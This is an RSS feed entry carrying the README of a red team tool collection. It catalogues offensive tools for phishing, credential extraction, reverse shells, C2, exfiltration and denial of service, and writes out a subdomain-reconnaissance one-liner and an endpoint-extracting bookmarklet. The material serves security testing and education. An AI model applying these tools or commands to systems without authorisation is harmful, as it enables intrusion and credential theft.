<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub All Languages Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-01-02T01:29:48Z</updated>
  <subtitle>Daily Trending of All Languages in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>A-poc/RedTeam-Tools</title>
    <updated>2023-01-02T01:29:48Z</updated>
    <id>tag:github.com,2023-01-02:/A-poc/RedTeam-Tools</id>
    <link href="https://github.com/A-poc/RedTeam-Tools" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Tools and Techniques for Red Team / Penetration Testing&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;RedTeam-Tools&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210140513-273be5ad-89cb-4d3a-b72f-709f33928e63.png&#34; height=&#34;300&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;This github repository contains a collection of &lt;strong&gt;tools&lt;/strong&gt; and &lt;strong&gt;resources&lt;/strong&gt; that can be useful for &lt;strong&gt;red teaming activities&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;Warning&lt;/strong&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;em&gt;The materials in this repository are for informational and educational purposes only. They are not intended for use in any illegal activities.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;em&gt;Hide Tool List headings with the arrow.&lt;/em&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;em&gt;Click ðŸ”™ to get back to the list.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;Tool List&lt;/h1&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Reconnaissance&lt;/b&gt; $\textcolor{gray}{\text{12 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#crtsh---httprobe---eyewitness&#34;&gt;crt.sh -&amp;gt; httprobe -&amp;gt; EyeWitness&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Automated domain screenshotting&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#jsendpoints&#34;&gt;jsendpoints&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Extract page DOM links&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#nuclei&#34;&gt;nuclei&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Vulnerability scanner&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#certsniff&#34;&gt;certSniff&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Certificate transparency log keyword sniffer&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#gobuster&#34;&gt;gobuster&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Website path brute force&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#dnsrecon&#34;&gt;dnsrecon&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Enumerate DNS records&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#shodanio&#34;&gt;Shodan.io&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Public facing system knowledge base&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#aort&#34;&gt;AORT (All in One Recon Tool)&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Subdomain enumeration&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#spoofcheck&#34;&gt;spoofcheck&lt;/a&gt;&lt;/b&gt;&lt;i&gt; SPF/DMARC record checker&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#awsbucketdump&#34;&gt;AWSBucketDump&lt;/a&gt;&lt;/b&gt;&lt;i&gt; S3 bucket enumeration&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#githarvester&#34;&gt;GitHarvester&lt;/a&gt;&lt;/b&gt;&lt;i&gt; GitHub credential searcher&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#trufflehog&#34;&gt;truffleHog&lt;/a&gt;&lt;/b&gt;&lt;i&gt; GitHub credential scanner&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Resource Development&lt;/b&gt; $\textcolor{gray}{\text{5 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#chimera&#34;&gt;Chimera&lt;/a&gt;&lt;/b&gt;&lt;i&gt; PowerShell obfuscation&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#msfvenom&#34;&gt;msfvenom&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Payload creation&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#wsh&#34;&gt;WSH&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Wsh payload&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#hta&#34;&gt;HTA&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Hta payload&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#vba&#34;&gt;VBA&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Vba payload&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Initial Access&lt;/b&gt; $\textcolor{gray}{\text{6 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#bash-bunny&#34;&gt;Bash Bunny&lt;/a&gt;&lt;/b&gt;&lt;i&gt; USB attack tool&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#evilgophish&#34;&gt;EvilGoPhish&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Phishing campaign framework&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#social-engineer-toolkit-set&#34;&gt;The Social-Engineer Toolkit&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Phishing campaign framework&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#hydra&#34;&gt;Hydra&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Brute force tool&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#squarephish&#34;&gt;SquarePhish&lt;/a&gt;&lt;/b&gt;&lt;i&gt; OAuth/QR code phishing framework&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#king-phisher&#34;&gt;King Phisher&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Phishing campaign framework&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Execution&lt;/b&gt; $\textcolor{gray}{\text{5 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#donut&#34;&gt;Donut&lt;/a&gt;&lt;/b&gt;&lt;i&gt; In-memory .NET execution&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#macro_pack&#34;&gt;Macro_pack&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Macro obfuscation&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#powersploit&#34;&gt;PowerSploit&lt;/a&gt;&lt;/b&gt;&lt;i&gt; PowerShell script suite&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#rubeus&#34;&gt;Rubeus&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Active directory hack tool&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#sharpup&#34;&gt;SharpUp&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Windows vulnerability identifier&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Persistence&lt;/b&gt; $\textcolor{gray}{\text{3 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/impacket&#34;&gt;Impacket&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Python script suite&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#empire&#34;&gt;Empire&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Post-exploitation framework&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#sharpersist&#34;&gt;SharPersist&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Windows persistence toolkit&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Privilege Escalation&lt;/b&gt; $\textcolor{gray}{\text{7 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#linpeas&#34;&gt;LinPEAS&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Linux privilege escalation&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#winpeas&#34;&gt;WinPEAS&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Windows privilege escalation&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#linux-smart-enumeration&#34;&gt;linux-smart-enumeration&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Linux privilege escalation&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#certify&#34;&gt;Certify&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Active directory privilege escalation&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#get-gpppassword&#34;&gt;Get-GPPPassword&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Windows password extraction&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#sherlock&#34;&gt;Sherlock&lt;/a&gt;&lt;/b&gt;&lt;i&gt; PowerShell privilege escalation tool&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#watson&#34;&gt;Watson&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Windows privilege escalation tool&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Defense Evasion&lt;/b&gt; $\textcolor{gray}{\text{2 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#invoke-obfuscation&#34;&gt;Invoke-Obfuscation&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Script obfuscator&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#veil&#34;&gt;Veil&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Metasploit payload obfuscator&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Credential Access&lt;/b&gt; $\textcolor{gray}{\text{4 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#mimikatz&#34;&gt;Mimikatz&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Windows credential extractor&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#lazagne&#34;&gt;LaZagne&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Local password extractor&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#hashcat&#34;&gt;hashcat&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Password hash cracking&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#john-the-ripper&#34;&gt;John the Ripper&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Password hash cracking&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Discovery&lt;/b&gt; $\textcolor{gray}{\text{4 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#pcredz&#34;&gt;PCredz&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Credential discovery PCAP/live interface&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#pingcastle&#34;&gt;PingCastle&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Active directory assessor&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#seatbelt&#34;&gt;Seatbelt&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Local vulnerability scanner&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#adrecon&#34;&gt;ADRecon&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Active directory recon&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Lateral Movement&lt;/b&gt; $\textcolor{gray}{\text{5 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#crackmapexec&#34;&gt;crackmapexec&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Windows/Active directory lateral movement toolkit&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#enabling-rdp&#34;&gt;Enabling RDP&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Windows RDP enable command&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#upgrading-shell-to-meterpreter&#34;&gt;Upgrading shell to meterpreter&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Reverse shell improvement&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#forwarding-ports&#34;&gt;Forwarding Ports&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Local port forward command&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#jenkins-reverse-shell&#34;&gt;Jenkins reverse shell&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Jenkins shell command&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Collection&lt;/b&gt; $\textcolor{gray}{\text{1 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#bloodhound&#34;&gt;BloodHound&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Active directory visualisation&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Command and Control&lt;/b&gt; $\textcolor{gray}{\text{6 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#havoc&#34;&gt;Havoc&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Command and control framework&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#covenant&#34;&gt;Covenant&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Command and control framework (.NET)&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#merlin&#34;&gt;Merlin&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Command and control framework (Golang)&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#metasploit-framework&#34;&gt;Metasploit Framework&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Command and control framework (Ruby)&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#pupy&#34;&gt;Pupy&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Command and control framework (Python)&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#brute-ratel&#34;&gt;Brute Ratel&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Command and control framework ($$$)&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Exfiltration&lt;/b&gt; $\textcolor{gray}{\text{4 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#dnscat2&#34;&gt;Dnscat2&lt;/a&gt;&lt;/b&gt;&lt;i&gt; C2 via DNS tunneling&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#cloakify&#34;&gt;Cloakify&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Data transformation for exfiltration&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#pyexfil&#34;&gt;PyExfil&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Data exfiltration PoC&lt;/i&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#powershell-rat&#34;&gt;Powershell RAT&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Python based backdoor&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;&lt;b&gt;Impact&lt;/b&gt; $\textcolor{gray}{\text{1 tools}}$&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#slowloris&#34;&gt;SlowLoris&lt;/a&gt;&lt;/b&gt;&lt;i&gt; Simple denial of service&lt;/i&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;h1&gt;Reconnaissance&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;crt.sh -&amp;gt; httprobe -&amp;gt; EyeWitness&lt;/h3&gt; &#xA;&lt;p&gt;I have put together a bash one-liner that:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Passively collects a list of subdomains from certificate associations (&lt;a href=&#34;https://crt.sh/&#34;&gt;crt.sh&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Actively requests each subdomain to verify it&#39;s existance (&lt;a href=&#34;https://github.com/tomnomnom/httprobe&#34;&gt;httprobe&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Actively screenshots each subdomain for manual review (&lt;a href=&#34;https://github.com/FortyNorthSecurity/EyeWitness&#34;&gt;EyeWitness&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;domain=DOMAIN_COM;rand=$RANDOM;curl -fsSL &#34;https://crt.sh/?q=${domain}&#34; | pup &#39;td text{}&#39; | grep &#34;${domain}&#34; | sort -n | uniq | httprobe &amp;gt; /tmp/enum_tmp_${rand}.txt; python3 /usr/share/eyewitness/EyeWitness.py -f /tmp/enum_tmp_${rand}.txt --web&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note: You must have &lt;a href=&#34;https://github.com/tomnomnom/httprobe&#34;&gt;httprobe&lt;/a&gt;, &lt;a href=&#34;https://github.com/EricChiang/pup&#34;&gt;pup&lt;/a&gt; and &lt;a href=&#34;https://github.com/FortyNorthSecurity/EyeWitness&#34;&gt;EyeWitness&lt;/a&gt; installed and change &#39;DOMAIN_COM&#39; to the target domain. You are able to run this script concurrently in terminal windows if you have multiple target root domains&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/192104474-5836138a-4a61-44fd-b3e3-b2a908c2928e.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/192104501-e038aff8-1e51-4cc3-a286-54e93408ed4e.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://twitter.com/renniepak/status/1602620834463588352&#34;&gt;jsendpoints&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A JavaScript bookmarklet for extracting all webpage endpoint links on a page.&lt;/p&gt; &#xA;&lt;p&gt;Created by &lt;a href=&#34;https://twitter.com/renniepak&#34;&gt;@renniepak&lt;/a&gt;, this JavaScript code snippet can be used to extract all endpoints (starting with /) from the current webpage DOM including all external script sources embedded on the webpage.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;javascript:(function(){var scripts=document.getElementsByTagName(&#34;script&#34;),regex=/(?&amp;lt;=(\&#34;|\&#39;|\`))\/[a-zA-Z0-9_?&amp;amp;=\/\-\#\.]*(?=(\&#34;|\&#39;|\`))/g;const results=new Set;for(var i=0;i&amp;lt;scripts.length;i++){var t=scripts[i].src;&#34;&#34;!=t&amp;amp;&amp;amp;fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log(&#34;An error occurred: &#34;,t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+&#34;&amp;lt;br&amp;gt;&#34;)})}setTimeout(writeResults,3e3);})();&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage (Bookmarklet)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Create a bookmarklet...&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;Right click your bookmark bar&lt;/code&gt;&lt;/li&gt; &#xA; 